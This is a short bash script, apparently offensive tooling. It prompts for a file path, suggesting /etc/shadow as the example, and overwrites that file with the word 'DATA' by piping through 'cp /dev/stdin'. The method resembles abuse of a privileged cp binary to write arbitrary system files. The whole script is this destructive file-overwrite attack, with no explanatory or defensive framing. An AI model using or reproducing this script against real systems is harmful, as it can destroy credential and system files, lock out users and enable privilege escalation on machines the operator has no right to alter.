#!/bin/bash
echo -n "[+] Enter file path(eg:- /etc/shadow): "
read filepath
echo "DATA" | cp /dev/stdin "$filepath"
